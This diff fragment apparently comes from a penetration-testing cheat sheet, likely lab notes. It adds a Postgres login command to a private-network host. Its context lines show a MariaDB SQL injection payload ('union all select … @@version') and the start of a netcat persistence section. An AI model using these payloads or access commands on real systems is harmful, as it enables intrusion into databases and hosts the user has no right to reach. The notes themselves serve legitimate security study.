@@ -276,6 +276,11 @@ MARIADB SQLi
 http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
 ```
 
+POSTGRES
+```bash
+$ psql -h 192.168.147.47 -U postgres -p 5437
+```
+
 PERSISTENCE
 ```bash
 # netcat run registry
